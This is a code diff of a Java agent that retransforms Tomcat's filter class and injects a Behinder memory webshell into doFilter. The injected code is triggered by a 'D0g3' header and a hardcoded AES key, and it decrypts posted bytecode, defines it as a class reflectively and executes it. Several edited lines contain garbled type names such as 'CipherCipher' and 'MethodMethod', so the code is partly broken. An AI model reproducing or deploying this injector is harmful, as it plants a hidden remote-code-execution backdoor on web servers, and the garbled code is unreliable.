@@ -18,6 +18,7 @@ public class TomcatAgentFilter {
         for (Class clas:classes){
             if (clas.getName().equals(ClassName)){
                 try{
+                    System.out.println(clas.getName());
                     // 对类进行重新定义
                     ins.retransformClasses(new Class[]{clas});
                 } catch (Exception e){
@@ -38,51 +39,56 @@ public class TomcatAgentFilter {
                 try {
                     CtClass c = pool.getCtClass(className);
                     CtMethod m = c.getDeclaredMethod("doFilter");
-                    m.insertBefore("        String behinderShellHeader = \"D0g3\";\n" +
-                            "        String behinderShellPwd = \"b9ecd0aebe82a741\"; // Crilwa\n" +
-                            "        if(((HttpServletRequest)servletRequest).getHeader(behinderShellHeader) != null&&(((HttpServletRequest)servletRequest).getMethod().equals(\"POST\"))) {\n" +
+
+                    m.insertBefore("        java.lang.String behinderShellHeader = \"D0g3\";\n" +
+                            "        java.lang.String behinderShellPwd = \"b9ecd0aebe82a741\"; // Crilwa\n" +
+                            "        javax.servlet.http.HttpServletRequest req =  request;\n" +
+                            "        javax.servlet.http.HttpServletResponse res = response;\n" +
+                            "        if(req.getHeader(behinderShellHeader) != null&&req.getMethod().equals(\"POST\")) {\n" +
                             "            //behind4 shell\n" +
                             "            try {\n" +
-                            "                String k = behinderShellPwd;\n" +
-                            "                HttpSession session = ((HttpServletRequest) servletRequest).getSession();\n" +
+                            "                java.lang.String k = behinderShellPwd;\n" +
+                            "                javax.servlet.http.HttpSession session = req.getSession();\n" +
                             "                session.putValue(\"u\", k);\n" +
-                            "                Cipher c = Cipher.getInstance(\"AES\");\n" +
-                            "                c.init(2, new SecretKeySpec(k.getBytes(), \"AES\"));\n" +
+                            "                javax.crypto.CipherCipher c = Cipher.getInstance(\"AES\");\n" +
+                            "                c.init(2, new javax.crypto.spec.SecretKeySpec(k.getBytes(), \"AES\"));\n" +
                             "\n" +
-                            "                HashMap map = new HashMap();\n" +
-                            "                map.put(\"request\", servletRequest);\n" +
-                            "                map.put(\"response\", servletResponse);\n" +
+                            "                java.util.HashMap map = new HashMap();\n" +
+                            "                map.put(\"request\", req);\n" +
+                            "                map.put(\"response\", res);\n" +
                             "                map.put(\"session\", session);\n" +
                             "\n" +
                             "                //取classloader\n" +
                             "                byte[] bytecode = java.util.Base64.getDecoder().decode(\"yv66vgAAADQAGgoABAAUCgAEABUHABYHABcBAAY8aW5pdD4BABooTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQADTFU7AQABYwEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQABZwEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEAAWIBAAJbQgEAClNvdXJjZUZpbGUBAAZVLmphdmEMAAUABgwAGAAZAQABVQEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAC2RlZmluZUNsYXNzAQAXKFtCSUkpTGphdmEvbGFuZy9DbGFzczsAIQADAAQAAAAAAAIAAAAFAAYAAQAHAAAAOgACAAIAAAAGKiu3AAGxAAAAAgAIAAAABgABAAAAAgAJAAAAFgACAAAABgAKAAsAAAAAAAYADAANAAEAAQAOAA8AAQAHAAAAPQAEAAIAAAAJKisDK763AAKwAAAAAgAIAAAABgABAAAAAwAJAAAAFgACAAAACQAKAAsAAAAAAAkAEAARAAEAAQASAAAAAgAT\");\n" +
-                            "                ClassLoader cl = (ClassLoader) Thread.currentThread().getContextClassLoader();\n" +
+                            "                java.lang.ClassLoader cl = (ClassLoader) Thread.currentThread().getContextClassLoader();\n" +
                             "                java.lang.reflect.Method define = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getDeclaredMethod(\"defineClass\", byte[].class, int.class, int.class);\n" +
                             "                define.setAccessible(true);\n" +
-                            "                Class uclass = null;\n" +
+                            "                java.lang.Class uclass = null;\n" +
                             "                try {\n" +
                             "                    uclass = cl.loadClass(\"U\");\n" +
                             "                } catch (ClassNotFoundException e) {\n" +
                             "                    uclass = (Class) define.invoke(cl, bytecode, 0, bytecode.length);\n" +
                             "                }\n" +
                             "\n" +
-                            "                Constructor constructor = uclass.getDeclaredConstructor(ClassLoader.class);\n" +
+                            "                java.lang.reflect.ConstructorConstructor constructor = uclass.getDeclaredConstructor(ClassLoader.class);\n" +
                             "                constructor.setAccessible(true);\n" +
                             "                Object u = constructor.newInstance(this.getClass().getClassLoader());\n" +
-                            "                Method Um = uclass.getDeclaredMethod(\"g\", byte[].class);\n" +
+                            "                java.lang.reflect.MethodMethod Um = uclass.getDeclaredMethod(\"g\", byte[].class);\n" +
                             "                Um.setAccessible(true);\n" +
                             "\n" +
                             "                //冰蝎payload\n" +
-                            "                byte[] evilClassBytes = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(servletRequest.getReader().readLine()));\n" +
-                            "                Class evilclass = (Class) Um.invoke(u, evilClassBytes);\n" +
+                            "                byte[] evilClassBytes = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(req.getReader().readLine()));\n" +
+                            "                java.lang.Class evilclass = (Class) Um.invoke(u, evilClassBytes);\n" +
                             "                Object a = evilclass.newInstance();\n" +
-                            "                Method b = evilclass.getDeclaredMethod(\"equals\", Object.class);\n" +
+                            "                java.lang.reflect.Method b = evilclass.getDeclaredMethod(\"equals\", Object.class);\n" +
                             "                b.setAccessible(true);\n" +
                             "                b.invoke(a, map);\n" +
                             "            } catch (Exception e) {\n" +
                             "                // pass\n" +
                             "            }\n" +
                             "        }");
+
+
                     /*
                     m.insertBefore("javax.servlet.http.HttpServletRequest req =  request;\n" +
                             "javax.servlet.http.HttpServletResponse res = response;\n" +
@@ -104,7 +110,9 @@ public class TomcatAgentFilter {
                             "    }\n" +
                             "}");
 
+
                      */
+
                     byte[] bytes = c.toBytecode();
                     // 将 c 从 classpool 中删除以释放内存
                     c.detach();
